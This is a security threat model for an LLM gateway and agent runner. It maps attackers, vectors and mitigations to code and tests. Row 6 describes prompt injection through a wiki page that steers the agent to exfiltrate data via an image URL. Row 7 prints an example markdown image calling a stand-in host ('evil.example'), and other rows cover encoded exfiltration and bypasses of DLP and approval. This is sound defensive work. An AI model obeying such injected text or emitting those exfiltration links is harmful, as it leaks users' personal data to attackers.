# Threat model

Scope: the Aegis gateway, its agent runner and tools, its stores, and its clients.
Method: attacker, vector, impact, mitigation, plus a STRIDE pass. Every mitigation names
the code that implements it and the test that proves it.

## Assets

| Asset | Why it matters |
|-------|----------------|
| Customer PII (names, emails, phones, cards, SSN-like IDs) | Regulatory exposure (GDPR, PCI DSS, state privacy laws), customer trust |
| Confidential business context (roadmaps, pricing, M&A, legal) | Market and legal harm, insider-trading exposure |
| Secrets (API keys, passwords, private keys) | Direct system compromise |
| Token vault contents and key | Mapping back from placeholders to real data |
| Audit log | Legal evidence; must not leak, must not be editable |
| Policy | Weakening it silently turns off protection |

## Attackers

| ID | Attacker | Capability |
|----|----------|------------|
| T1 | Careless employee | Pastes data into a prompt without thinking |
| T2 | External attacker controlling content | Can write to a wiki page, a support ticket, an email, a web page the agent reads |
| T3 | Malicious or curious insider | Valid SSO account, tries to read other users' data or move data out |
| T4 | Third-party LLM provider (or its breach) | Sees everything sent to it |
| T5 | Attacker with database or log access | Reads logs and tables, may try to edit them |
| T6 | Rogue or careless policy admin | Can change rules |

## Attacker, vector, impact, mitigation

| # | Attacker | Vector | Impact | Mitigation | Code | Test |
|---|----------|--------|--------|------------|------|------|
| 1 | T1 | **Direct paste**: name, email, card in a complaint | PII reaches the third party | DLP detects; tokenization replaces with placeholders before the external call; restore for owner only | `dlp/engine.py`, `vault/vault.py` | `test_scenarios.py::test_scenario_1_direct_paste` |
| 2 | T1 | **Obfuscated paste**: `dana dot holloway at example dot com`, digits with spaces, fullwidth digits, zero-width characters | Pattern DLP bypassed | NFKC normalization with offset map, zero-width stripping, obfuscated-email detector, separator-tolerant card regex with Luhn | `dlp/normalize.py`, `dlp/regex_detectors.py` | red-team `obfuscated_*` cases |
| 3 | T1 | **Context leak**: confidential note with no pattern | Roadmap or M&A context reaches third party | Private classifier and context markers label CONFIDENTIAL/RESTRICTED; route local-only or block | `classifier/`, `policy/engine.py` | `test_scenario_2_context_leak` |
| 4 | T1 | **Secrets paste**: API key, password, private key in a stack trace | Credential exposure | Secret detectors; irreversible redaction; private keys block | `dlp/regex_detectors.py` | red-team `secret_*` |
| 5 | T1, T3 | **Tool exfiltration**: agent emails a summary to a personal Gmail | Data moved outside corporate control | Recipient resolved through vault; personal-provider blocklist; corporate allowlist; high-risk tools need approval | `guard/interceptor.py` | `test_scenario_3_tool_exfiltration` |
| 6 | T2 | **Prompt injection via document**: wiki page tells agent to append data to an image URL | Zero-click exfiltration | Injection detector on tool outputs; session taint; URL allowlist; decoded-payload DLP; placeholders in URLs block | `guard/injection.py`, `guard/interceptor.py` | `test_scenario_4_injection` |
| 7 | T2 | **Exfiltration through the answer**: model emits `![](https://evil.example/?d=...)`, client renders it | Data leaves via the user's browser | Output sanitizer removes images and links to non-allowlisted domains and any URL carrying placeholders, before restore; restore never writes into URLs | `guard/output.py` | `test_output_sanitizer.py` |
| 8 | T2 | **Encoded exfiltration**: base64 or hex of the email in a query string | URL scanning bypassed | Recursive decode (percent, base64, hex) before DLP | `guard/urls.py` | red-team `tool_encoded_*` |
| 9 | T3 | **Cross-user de-tokenization**: reuse another user's session id | Read another user's PII | Session ownership check; AAD binds user, session, purpose; RBAC restore scopes | `vault/vault.py`, `gateway/routes_vault.py` | `test_rbac.py` |
| 10 | T3 | **Self-approval** of a risky tool call | Bypass human review | Four-eyes rule; approver needs `tool:approve`; same tenant; expiry | `guard/approvals.py` | `test_approvals.py` |
| 11 | T3 | **Personal or foreign-tenant account** signs in | Uncontrolled access | `tid` must be in allowed tenants; `amr` must include `sso`; RS256 only, `iss` and `aud` checked | `auth/oidc.py` | `test_auth.py` |
| 12 | T3 | **Bulk extraction** through many requests | Slow data dump | Per-user rate limit; bulk-PII rule escalates prompts with many restricted entities to approval | `auth/ratelimit.py`, `policy/engine.py` | `test_rate_limit.py`, red-team `bulk_*` |
| 13 | T4 | Provider stores or trains on prompts | Long-tail exposure | Provider only ever receives placeholders and non-confidential context | whole pipeline | mock LLM evidence log in all scenario tests |
| 14 | T5 | **Log leakage**: raw PII in audit or app logs | Second copy of the data | Events built from redacted data; content withheld above INTERNAL; regex scrubber; app logs never include prompt text | `audit/` | `test_no_pii_in_logs.py` |
| 15 | T5 | **Audit tampering**: edit or delete an event | Destroy evidence | Append-only triggers; HMAC chain with key outside DB; verify endpoint | `audit/store.py` | `test_audit.py` |
| 16 | T5 | **Vault theft**: dump Redis | Recover PII | AES-256-GCM ciphertext only; key in env not in Redis; TTL; no Redis persistence | `vault/crypto.py` | `test_vault.py` |
| 17 | T6 | **Silent policy weakening**: set `CREDIT_CARD: allow` | Protection off | Regression gate on every policy write (and in CI); 409 on regression; every attempt audited | `policy/regression.py` | `test_policy_admin.py` |
| 18 | T2 | **Malicious model artifact** swapped on disk | Code execution | Classifier stored as JSON, never pickle; SHA-256 checked at load | `classifier/model.py` | `test_classifier.py` |
| 19 | any | **Denial of service** via huge prompts | Gateway CPU exhaustion | 64 KB body limit; rate limit; bounded agent steps | `gateway/app.py` | `test_limits.py` |

## STRIDE summary

| STRIDE | Example | Primary control |
|--------|---------|-----------------|
| Spoofing | Forged JWT, `alg=none`, HS256 key confusion | RS256-only verification against JWKS, issuer and audience checks |
| Tampering | Edit audit row, swap model file, weaken policy | Triggers + HMAC chain; SHA-256 artifact check; regression gate |
| Repudiation | "I never sent that" | Every prompt, decision, tool call, and approval audited with user and policy version |
| Information disclosure | PII to provider, PII in logs, cross-user restore | Tokenization, classifier routing, scrubber, AAD binding, RBAC |
| Denial of service | Large payloads, request floods | Body limit, rate limit, step limit |
| Elevation of privilege | Self-approval, employee reading audit | Four-eyes, permission checks on every admin route |

## Out of scope (see `docs/tradeoffs-and-limitations.md`)

* Traffic that bypasses the gateway (personal devices, consumer AI sites). Needs egress
  controls or a CASB.
* An insider with legitimate access who copies data by hand.
* Screenshots, photos of screens, or retyping.
* A compromised gateway host (it holds the vault key by design).
